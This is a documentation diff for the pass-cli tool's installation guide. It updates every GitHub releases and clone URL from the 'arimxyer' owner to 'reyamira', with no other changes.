@@ -10,7 +10,7 @@ Manual installation gives you direct control over the binary location and versio
 
 1. **Visit the Releases Page**
 
-   Go to [GitHub Releases](https://github.com/arimxyer/pass-cli/releases/latest)
+   Go to [GitHub Releases](https://github.com/reyamira/pass-cli/releases/latest)
 
 2. **Choose Your Platform**
 
@@ -39,7 +39,7 @@ Verifying checksums ensures the downloaded file hasn't been tampered with.
 # Download your platform's archive and checksums.txt
 # Go to GitHub Releases and download your platform's archive
 # Example for Linux amd64:
-# 1. Visit: https://github.com/arimxyer/pass-cli/releases/latest
+# 1. Visit: https://github.com/reyamira/pass-cli/releases/latest
 # 2. Download: pass-cli_VERSION_linux_amd64.tar.gz
 # 3. Download: checksums.txt
 
@@ -71,7 +71,7 @@ fi
 #### Windows (PowerShell)
 
 ```powershell
-# After downloading from https://github.com/arimxyer/pass-cli/releases/latest
+# After downloading from https://github.com/reyamira/pass-cli/releases/latest
 # Replace with your downloaded filename
 $file = "pass-cli_X.Y.Z_windows_amd64.zip"
 
@@ -188,7 +188,7 @@ git --version
 
 ```bash
 # Clone the repository
-git clone https://github.com/arimxyer/pass-cli.git
+git clone https://github.com/reyamira/pass-cli.git
 cd pass-cli
 
 # Checkout specific version (optional)
